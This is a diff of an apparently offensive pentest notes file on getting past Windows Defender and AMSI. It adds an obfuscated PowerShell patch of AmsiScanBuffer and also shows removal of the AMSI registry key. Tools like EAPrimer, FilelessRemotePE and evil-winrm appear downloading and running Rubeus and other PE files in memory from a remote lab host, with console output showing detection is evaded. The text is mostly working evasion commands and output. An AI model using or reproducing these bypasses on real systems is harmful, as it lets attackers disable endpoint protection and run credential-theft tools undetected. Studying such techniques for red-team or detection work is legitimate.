@@ -12,15 +12,15 @@ I.   Reminder & Definitions
 
 II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (AMSI) and AV products to be able to download and execute (in-memory) 
      any offensive PowerShell scripts (and PE files thanks to Invoke-ReflectivePEInjection technique)
-     ➤ Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in the PowerShell session 
-     ➤ Example of AMSI and AV bypass by patching the AMSI DLL
-     ➤ Example of AMSI and AV bypass by modifying a registry key (admin priv required)
-     ➤ Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+     ➤ Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session 
+     ➤ Examples of AV bypass by patching the AMSI DLL
+     ➤ Examples of AV bypass by modifying a registry key to diasable the AMSI (admin priv required)
+     ➤ Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 
 III. Examples of techniques to download and execute in-memory offensive Portable Executable (PE) files (without using PowerShell) to bypass AV products
-     ➤ Example of AV & AMSI bypass using the tool 'FilelessRemotePE'  	(it runs only C/C++/ASM based binaries)
-     ➤ Example of AV & AMSI bypass using the tool 'EAPrimer'		(it runs only .Net assemblies based on C#)
-     ➤ Example of AV & AMSI bypass using the tool 'ExecRemoteAssembly'  (it runs only .Net assemblies based on C#)
+     ➤ Example of AV bypass (ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE'   (it runs only C/C++/ASM based binaries)
+     ➤ Example of AV bypass (AMSI + ETW patching) using the tool 'ExecRemoteAssembly' 		 (it runs only .Net assemblies based on C#)
+     ➤ Example of AV bypass (AMSI patching) using the tool 'EAPrimer'				 (it runs only .Net assemblies based on C#)
 
 
 ================================================================================================================================================
@@ -133,7 +133,7 @@ II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (
 ================================================================================================================================================
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.1 Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+2.1 Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
@@ -244,11 +244,14 @@ This script contains malicious content and has been blocked by your antivirus so
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.2 Example of AMSI and AV bypass by patching the AMSI DLL
+2.2 Examples of AV bypass by patching the AMSI DLL
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
-=> Source: https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
 
+PoC / Technique n°1
+--------------------
+
+=> Source: https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
 
 C:\Users\Auditor\Desktop>powershell -exec bypass
 Windows PowerShell
@@ -278,8 +281,41 @@ At line:1 char:1
     + FullyQualifiedErrorId : CommandNotFoundException
 
 
+PoC / Technique n°2
+---------------------
+
+PS C:\Users\Administrator> amsiscanstring
+At line:1 char:1
++ amsiscanstring
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS C:\Users\Administrator> ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
+PS C:\Users\Administrator> Add-Type ${_/==\_/\__/===\_/}
+PS C:\Users\Administrator> ${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
+PS C:\Users\Administrator> ${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
+PS C:\Users\Administrator> ${/==\_/=\/\__/\/\/} = 0
+PS C:\Users\Administrator> [Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/}) 
+True
+PS C:\Users\Administrator> ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+PS C:\Users\Administrator> [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
+
+
+PS C:\Users\Administrator> amsiscanstring
+amsiscanstring : The term 'amsiscanstring' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a
+path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanstring
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanstring:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.3 Example of AMSI and AV bypass technique by modifying a registry key (admin priv required)
+2.3 Example of AV bypass technique by modifying a registry key to disable the AMSI (admin priv required)
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
@@ -290,7 +326,7 @@ PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.4 Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+2.4 Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
@@ -518,7 +554,7 @@ Affected items:
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
        As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
-       directly loaded in memory.
+       directly loaded into memory.
        
 ┌──(kali㉿kali)-[~/Documents]
 └─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'
@@ -582,7 +618,7 @@ III. Examples of techniques to download and execute in-memory offensive Portable
 ===========================================================================================================================================================
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
-3.1 Example of AV bypass using the tool 'FilelessRemotePE'
+3.1 Example of AV bypass (ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE'  
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://github.com/D1rkMtr/FilelessRemotePE
@@ -787,81 +823,17 @@ PS C:\Users\Administrator\Documents\Tools-AD>
 
 <SNIP>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------
-3.2 Example of AMSI and AV bypass using the tool 'EAPrimer'
------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-=> Source: https://github.com/m8sec/EAPrimer
-
-The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
-On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
-By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.
-
-Reminder: 
-- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
-- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.
-
-
-Test/PoC - Download and execution in-memory of Rubeus.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Users\Administrator>cd c:\temp
-
-c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe
-[*] EAPrimer v0.1.2
-[*] Applying In-Memory Patch
-[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v1.5.0
-
- Ticket requests and renewals:
-
-    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
-        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]
-
-    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
-        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
- <SNIP>
-
-c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentluid
-[*] EAPrimer v0.1.2
-[*] Applying In-Memory Patch
-[*] Assembly Args: "currentluid"
-[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
-
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v1.5.0
-
-[*] Action: Display current LUID
-
-[*] Current LogonID (LUID) : 0x739b4 (473524)
-
- <SNIP>
-
-
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
-3.3 Example of AMSI and AV bypass using the tool 'ExecRemoteAssembly'
+3.2 Example of AV bypass (AMSI + ETW patching) using the tool 'ExecRemoteAssembly' 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://github.com/D1rkMtr/ExecRemoteAssembly
 
-This tool allows to download and execute directly into memeroy a remote .Net assembly with arguments passing and with AMSI and ETW patching.
+This tool allows to download and execute directly into memory a remote .Net assembly with:
+> AMSI patching
+> ETW patching
+> arguments passing
 
 Limitaion: it can only run .NET assemblies that are based on C#.
 
@@ -944,3 +916,71 @@ PS C:\Users\Administrator\Documents\Tools-AD\ExecRemoteAssembly-main> .\ExecRemo
     m          :  calc\1
 ====== Hotfixes ======
 <SNIP>
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+3.3 Example of AV bypass (AMSI patching) using the tool 'EAPrimer'	
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source: https://github.com/m8sec/EAPrimer
+
+The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
+On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
+By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.
+
+Reminder: 
+- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
+- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.
+
+
+Test/PoC - Download and execution in-memory of Rubeus.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd c:\temp
+
+c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe
+[*] EAPrimer v0.1.2
+[*] Applying In-Memory Patch
+[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+ <SNIP>
+
+c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentluid
+[*] EAPrimer v0.1.2
+[*] Applying In-Memory Patch
+[*] Assembly Args: "currentluid"
+[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x739b4 (473524)
+
+ <SNIP>
+
